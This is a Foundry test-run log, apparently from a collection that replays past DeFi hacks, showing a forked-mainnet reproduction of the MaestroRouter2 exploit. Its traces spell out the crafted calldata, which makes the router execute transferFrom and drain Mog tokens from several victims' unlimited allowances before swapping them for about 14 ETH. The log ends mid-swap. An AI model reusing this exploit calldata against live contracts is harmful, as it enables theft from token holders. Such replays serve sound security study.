Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-10/MaestroRouter2_exp.sol:38:5:
   |
38 |     WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2072): Unused local variable.
  --> src/test/2023-10/MaestroRouter2_exp.sol:70:14:
   |
70 |             (bool success,) = address(router).call(data);
   |              ^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 729.55ms (1.76ms CPU time)

Ran 1 test for src/test/2023-10/MaestroRouter2_exp.sol:MaestroRouter2Exploit
[PASS] testExploit() (gas: 384928)
Logs:
  Attacker Mog balance before exploit: 0.000000000000000000
  Attacker Mog balance after exploit: 565463522794.182597666471533996
  Attacker ETH balance after exploit: 14.040863116812856819

Traces:
  [17764] MaestroRouter2Exploit::setUp()
    ├─ [0] VM::createSelectFork("mainnet")
    │   └─ ← [Return] 0
    ├─ [0] VM::label(MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e], "MaestroRouter2")
    │   └─ ← [Return]
    ├─ [0] VM::label(MaestroRouter2 Logic Contract: [0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a], "MaestroRouter2 Logic Contract")
    │   └─ ← [Return]
    ├─ [0] VM::label(Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], "Mog Token")
    │   └─ ← [Return]
    ├─ [0] VM::label(UniswapRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "UniswapRouterV2")
    │   └─ ← [Return]
    └─ ← [Stop]

  [461128] MaestroRouter2Exploit::testExploit()
    ├─ [0] VM::rollFork(18423219 [1.842e7])
    │   └─ ← [Return]
    ├─ [2615] Mog Token::balanceOf(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [245] Mog Token::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker Mog balance before exploit", val: 0, decimals: 18)
    ├─ [2826] Mog Token::allowance(0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F) [staticcall]
    │   └─ ← [Return] 7644407423323066647459234468 [7.644e27]
    ├─ [78805] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000004189ad9624f838eef865b09a0be3369eaacd8f6f0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000018b34e3cc95bf3495b3182a400000000000000000000000000000000000000000000000000000000)
    │   ├─ [73914] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000004189ad9624f838eef865b09a0be3369eaacd8f6f0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000018b34e3cc95bf3495b3182a400000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [71858] Mog Token::transferFrom(0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7644407423323066647459234468 [7.644e27])
    │   │   │   ├─ emit Transfer(from: 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7644407423323066647459234468 [7.644e27])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0 → 0x000000000000000000000000000000000000000018b34e3cc95bf3495b3182a4
    │   │   │   │   @ 0x65cd171553e276651c3194f3c448b3991defc8495cf642f17fbf099e0b9fdb27: 0x000000000000000000000000000000000000000018b34e3cc95bf3495b3182a4 → 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D) [staticcall]
    │   └─ ← [Return] 48204641774314921136106786239 [4.82e28]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000d0b4ee02e9ba15b9dac916d2ccabad50f836b24d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000009bc1f1f2c7a6ab8124e04dbf00000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000d0b4ee02e9ba15b9dac916d2ccabad50f836b24d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000009bc1f1f2c7a6ab8124e04dbf00000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48204641774314921136106786239 [4.82e28])
    │   │   │   ├─ emit Transfer(from: 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 48204641774314921136106786239 [4.82e28])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xdcf8b2cfd394f05635d769d10e870c8a5837ee834b8724776aebd849bbd942ab: 0x00000000000000000000000000000000000000009bc1f1f2c7a6ab8124e04dbf → 0
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x000000000000000000000000000000000000000018b34e3cc95bf3495b3182a4 → 0x0000000000000000000000000000000000000000b475402f91029eca8011d063
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0xe84180bdc970c01B30a326f610F110acB23EcdBe, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0xe84180bdc970c01B30a326f610F110acB23EcdBe) [staticcall]
    │   └─ ← [Return] 80397781241681974651232867727 [8.039e28]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000e84180bdc970c01b30a326f610f110acb23ecdbe0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000103c77c664325dfa8f0d2558f00000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000e84180bdc970c01b30a326f610f110acb23ecdbe0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000103c77c664325dfa8f0d2558f00000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0xe84180bdc970c01B30a326f610F110acB23EcdBe, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 80397781241681974651232867727 [8.039e28])
    │   │   │   ├─ emit Transfer(from: 0xe84180bdc970c01B30a326f610F110acB23EcdBe, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0xe84180bdc970c01B30a326f610F110acB23EcdBe, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 80397781241681974651232867727 [8.039e28])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xf67887c5ce1febd3a5623924ef653111a60a325174502c99842dba8f876c83a5: 0x000000000000000000000000000000000000000103c77c664325dfa8f0d2558f → 0
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000000b475402f91029eca8011d063 → 0x0000000000000000000000000000000000000001b83cbc95d4287e7370e425f2
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0x6476425a65Ae09e22383B68416b32AbE62896aa9, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0x6476425a65Ae09e22383B68416b32AbE62896aa9) [staticcall]
    │   └─ ← [Return] 334490752124122713685016489776 [3.344e29]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000006476425a65ae09e22383b68416b32abe62896aa90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000438cc43e676d67a0228ecaf3000000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000006476425a65ae09e22383b68416b32abe62896aa90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000438cc43e676d67a0228ecaf3000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0x6476425a65Ae09e22383B68416b32AbE62896aa9, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 334490752124122713685016489776 [3.344e29])
    │   │   │   ├─ emit Transfer(from: 0x6476425a65Ae09e22383B68416b32AbE62896aa9, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x6476425a65Ae09e22383B68416b32AbE62896aa9, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 334490752124122713685016489776 [3.344e29])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb4f3d6b7954fb4437c39476cf4009d010cbd930b46a003c0f5ccdd14490e9b8f: 0x000000000000000000000000000000000000000438cc43e676d67a0228ecaf30 → 0
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000001b83cbc95d4287e7370e425f2 → 0x0000000000000000000000000000000000000005f109007c4afef87599d0d522
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0x942beCA935703058E26527d0bD49D00E85841772, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0x942beCA935703058E26527d0bD49D00E85841772) [staticcall]
    │   └─ ← [Return] 81546385133717720246700811579 [8.154e28]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000942beca935703058e26527d0bd49d00e858417720000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000001077d96bc040cc2c39049253b00000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000942beca935703058e26527d0bd49d00e858417720000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000001077d96bc040cc2c39049253b00000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0x942beCA935703058E26527d0bD49D00E85841772, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81546385133717720246700811579 [8.154e28])
    │   │   │   ├─ emit Transfer(from: 0x942beCA935703058E26527d0bD49D00E85841772, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x942beCA935703058E26527d0bD49D00E85841772, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 81546385133717720246700811579 [8.154e28])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000005f109007c4afef87599d0d522 → 0x0000000000000000000000000000000000000006f88697384f0bbb392a19fa5d
    │   │   │   │   @ 0x9b393e8230ee7e4477a0fb3aa3acca8f41d6e7444a7ac60f1e3705f9ff54b178: 0x0000000000000000000000000000000000000001077d96bc040cc2c39049253b → 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0x968907878bDF60638FFdD5E4759289941333bf94, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0x968907878bDF60638FFdD5E4759289941333bf94) [staticcall]
    │   └─ ← [Return] 7755411711468452260359557922 [7.755e27]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000968907878bdf60638ffdd5e4759289941333bf940000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000190f204f4dff92f7c991d32200000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000968907878bdf60638ffdd5e4759289941333bf940000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000190f204f4dff92f7c991d32200000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0x968907878bDF60638FFdD5E4759289941333bf94, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7755411711468452260359557922 [7.755e27])
    │   │   │   ├─ emit Transfer(from: 0x968907878bDF60638FFdD5E4759289941333bf94, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x968907878bDF60638FFdD5E4759289941333bf94, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7755411711468452260359557922 [7.755e27])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000006f88697384f0bbb392a19fa5d → 0x00000000000000000000000000000000000000071195b7879d0b4e30f3abcd7f
    │   │   │   │   @ 0x58206a73f67d3bfaf5354b1986f9b935138995d9a95badba9869a035158600e9: 0x0000000000000000000000000000000000000000190f204f4dff92f7c991d322 → 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [2826] Mog Token::allowance(0xA5162195e6CB7483eea8bA878d147b0E90519c64, MaestroRouter2: [0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2615] Mog Token::balanceOf(0xA5162195e6CB7483eea8bA878d147b0E90519c64) [staticcall]
    │   └─ ← [Return] 5424143385553749039595786285 [5.424e27]
    ├─ [22405] MaestroRouter2::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000a5162195e6cb7483eea8ba878d147b0e90519c640000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000001186bf0a1fe0104a9896102d00000000000000000000000000000000000000000000000000000000)
    │   ├─ [22014] MaestroRouter2 Logic Contract::9239127f(000000000000000000000000aaee1a9723aadb7afa2810263653a34ba2c21c7a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000a5162195e6cb7483eea8ba878d147b0e90519c640000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000001186bf0a1fe0104a9896102d00000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [19958] Mog Token::transferFrom(0xA5162195e6CB7483eea8bA878d147b0E90519c64, MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5424143385553749039595786285 [5.424e27])
    │   │   │   ├─ emit Transfer(from: 0xA5162195e6CB7483eea8bA878d147b0E90519c64, to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   │   ├─ emit Transfer(from: 0xA5162195e6CB7483eea8bA878d147b0E90519c64, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5424143385553749039595786285 [5.424e27])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x00000000000000000000000000000000000000071195b7879d0b4e30f3abcd7f → 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac
    │   │   │   │   @ 0x120639ed22108a3de97c3f1926c87aaecf515b8e1e763486231520d2a5ada696: 0x00000000000000000000000000000000000000001186bf0a1fe0104a9896102d → 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    ├─ [615] Mog Token::balanceOf(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 565463522794182597666471533996 [5.654e29]
    ├─ [245] Mog Token::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker Mog balance after exploit", val: 565463522794182597666471533996 [5.654e29], decimals: 18)
    ├─ [24613] Mog Token::approve(UniswapRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 565463522794182597666471533996 [5.654e29])
    │   ├─ emit Approval(owner: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 565463522794182597666471533996 [5.654e29])
    │   ├─  storage changes:
    │   │   @ 0x911a87982733987439e36e2e722f6ea6e865fd905bdac35dc01b229c4f89cd70: 0 → 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac
    │   └─ ← [Return] true
    ├─ [102563] UniswapRouterV2::swapExactTokensForTokensSupportingFeeOnTransferTokens(565463522794182597666471533996 [5.654e29], 0, [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1698188015 [1.698e9])
    │   ├─ [23800] Mog Token::transferFrom(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d, 565463522794182597666471533996 [5.654e29])
    │   │   ├─ emit Transfer(from: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Mog Token: [0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a], value: 0)
    │   │   ├─ emit Transfer(from: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d, value: 565463522794182597666471533996 [5.654e29])
    │   │   ├─  storage changes:
    │   │   │   @ 0xe8370f8e7f793f91c2b6e49010bf52dbaaf58e8f07d988605364509f42c3ba3d: 0x000000000000000000000000000000000000009629cd2ecef0e852d8f341e8f9 → 0x000000000000000000000000000000000000009d4ce9a560add3b1547f83c6a5
    │   │   │   @ 0x911a87982733987439e36e2e722f6ea6e865fd905bdac35dc01b229c4f89cd70: 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac → 0
    │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac → 0
    │   │   └─ ← [Return] true
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2504] 0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d::getReserves() [staticcall]
    │   │   └─ ← [Return] 11897161313381593492873417976057 [1.189e31], 310344787079742609888 [3.103e20], 1698187883 [1.698e9]
    │   ├─ [615] Mog Token::balanceOf(0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d) [staticcall]
    │   │   └─ ← [Return] 12462624836175776090539889510053 [1.246e31]
